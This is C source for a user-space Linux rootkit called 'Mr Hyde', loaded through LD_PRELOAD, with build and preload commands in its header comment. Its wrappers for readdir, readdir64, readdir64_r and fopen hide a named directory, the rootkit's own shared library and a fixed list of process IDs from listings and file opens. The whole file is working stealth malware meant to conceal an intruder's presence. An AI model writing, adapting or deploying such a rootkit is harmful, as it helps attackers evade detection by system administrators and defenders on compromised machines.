/* Author: Gris Iscomeback 
 * Tested in kernels 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 * Name: Mr Hyde
 * Rootkit Ring3
 * gcc -fPIC -shared -o hyde.so -ldl hyde.c
 * export LD_PRELOAD=/home/.grisun0/hyde.so
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>

#define HIDDEN_DIR "lazyown_atomic_test"
#define HIDDEN_FILE "hyde.so"
#define HIDE_DIR ".grisun0"
#define MAX_HIDE_PIDS 11

typedef struct dirent original_dirent;
typedef struct dirent64 original_dirent64;
typedef struct dirent* (*original_readdir_t)(DIR*);
typedef struct dirent64* (*original_readdir64_t)(DIR*);

original_readdir_t original_readdir = NULL;
original_readdir64_t original_readdir64 = NULL;

// Array to hold the PIDs to hide
const char* hide_pids[MAX_HIDE_PIDS] = {
    "2397",
    "2398",
    "3102",
    "3109",
    "3110",
    "3112",
    "3204",
    "3218",     // Placeholder for PID 8
    "2822",     // Placeholder for PID 9
    "2823",
    "2705"
};

struct dirent* readdir(DIR* dirp) {
    if (original_readdir == NULL) {
        original_readdir = (original_readdir_t)dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return NULL;
        }
    }

    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        int needsToReturn = 0;

        if (strcmp(entry->d_name, HIDDEN_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(entry->d_name, HIDE_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(entry->d_name, HIDDEN_FILE) == 0) {
            needsToReturn = 1;
        }

        if (needsToReturn) {
            continue;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS; i++) {
            if (hide_pids[i] && strcmp(entry->d_name, hide_pids[i]) == 0) {
                break;
            }
        }
        if (i == MAX_HIDE_PIDS) {
            return entry;
        }
    }
    return NULL;
}

struct dirent64* readdir64(DIR* dirp) {
    if (original_readdir64 == NULL) {
        original_readdir64 = (original_readdir64_t)dlsym(RTLD_NEXT, "readdir64");
        if (original_readdir64 == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return NULL;
        }
    }

    struct dirent64* entry;
    while ((entry = original_readdir64(dirp)) != NULL) {
        int needsToReturn = 0;

        if (strcmp(entry->d_name, HIDDEN_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(entry->d_name, HIDE_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(entry->d_name, HIDDEN_FILE) == 0) {
            needsToReturn = 1;
        }

        if (needsToReturn) {
            continue;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS; i++) {
            if (hide_pids[i] && strcmp(entry->d_name, hide_pids[i]) == 0) {
                break;
            }
        }
        if (i == MAX_HIDE_PIDS) {
            return entry;
        }
    }
    return NULL;
}

int (*original_readdir64_r)(DIR *dirp, struct dirent64 *entry, struct dirent64 **result);
int readdir64_r(DIR *dirp, struct dirent64 *entry, struct dirent64 **result) {
    int ret;
    struct dirent64 *tmp;

    if (!original_readdir64_r) {
        original_readdir64_r = dlsym(RTLD_NEXT, "readdir64_r");
        if (!original_readdir64_r) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return -1;
        }
    }

    while ((ret = original_readdir64_r(dirp, entry, &tmp)) == 0) {
        int needsToReturn = 0;

        if (strcmp(tmp->d_name, HIDDEN_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(tmp->d_name, HIDE_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(tmp->d_name, HIDDEN_FILE) == 0) {
            needsToReturn = 1;
        }

        if (needsToReturn) {
            continue;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS; i++) {
            if (hide_pids[i] && strcmp(tmp->d_name, hide_pids[i]) == 0) {
                break;
            }
        }
        if (i == MAX_HIDE_PIDS) {
            *result = tmp;
            return 0;
        }
    }

    return ret;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen)
        orig_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, HIDDEN_FILE) != NULL) {
        errno = ENOENT;
        return NULL;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            errno = ENOENT;
            return NULL;
        }
    }

    return orig_fopen(pathname, mode);
}
